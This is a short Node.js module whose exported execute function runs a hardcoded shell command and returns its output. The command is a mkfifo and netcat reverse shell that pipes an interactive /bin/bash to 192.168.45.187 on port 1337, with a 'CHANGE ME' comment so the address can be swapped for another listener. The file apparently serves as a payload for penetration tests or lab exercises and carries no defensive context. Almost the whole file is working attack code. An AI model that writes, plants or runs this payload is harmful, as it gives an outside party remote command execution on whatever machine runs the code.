exports.execute = async () => {
  const { exec } = require('child_process');
  const { promisify } = require('util');
  const execAsync = promisify(exec);

  const command = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.187 1337 >/tmp/f'; // CHANGE ME 
  
  try {
    const { stdout, stderr } = await execAsync(command);

    return {
      command,
      exitCode: 0,
      stdout: stdout.trim().split('\n'),
      stderr: (stderr || '').trim(),
      timestamp: new Date().toISOString()
    };
  } catch (err) {
    return {
      command,
      exitCode: typeof err.code === 'number' ? err.code : 1,
      stdout: (err.stdout || '').toString().trim(),
      stderr: (err.stderr || err.message || String(err)).toString().trim(),
      timestamp: new Date().toISOString()
    };
  }
};
